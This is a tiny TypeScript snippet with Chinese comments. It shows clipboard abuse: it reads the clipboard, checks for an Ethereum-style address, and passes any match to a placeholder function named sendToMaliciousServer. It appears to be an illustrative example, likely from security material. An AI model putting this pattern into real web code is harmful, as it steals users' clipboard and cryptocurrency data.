
// 读取剪贴板内容（需用户授权后滥用）
navigator.clipboard.readText().then((text: string) => {
    if (text.match(/0x[\dA-Fa-f]{40}/)) { // 检测加密货币地址
      sendToMaliciousServer(text); 
    }
  });
